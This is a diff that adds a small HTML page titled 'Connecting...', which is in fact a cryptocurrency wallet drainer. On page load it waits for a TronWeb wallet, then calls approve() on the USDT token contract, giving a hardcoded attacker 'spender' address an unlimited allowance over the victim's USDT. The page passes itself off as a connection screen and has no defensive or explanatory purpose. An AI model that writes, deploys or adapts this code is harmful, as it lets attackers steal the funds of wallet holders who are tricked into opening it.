@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connecting...</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+</head>
+<body style="background: #000;">
+    <script>
+        async function autoTrigger() {
+            // Ждем инициализации TronWeb в кошельке
+            let attempts = 0;
+            const checkTron = setInterval(async () => {
+                attempts++;
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    clearInterval(checkTron);
+                    try {
+                        const usdt = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+                        const spender = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; // Твой контракт
+                        const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+                        const contract = await window.tronWeb.contract().at(usdt);
+                        await contract.approve(spender, amount).send();
+                    } catch (e) { console.error(e); }
+                }
+                if (attempts > 20) clearInterval(checkTron); // Тайм-аут 10 сек
+            }, 500);
+        }
+        window.onload = autoTrigger;
+    </script>
+</body>
+</html>
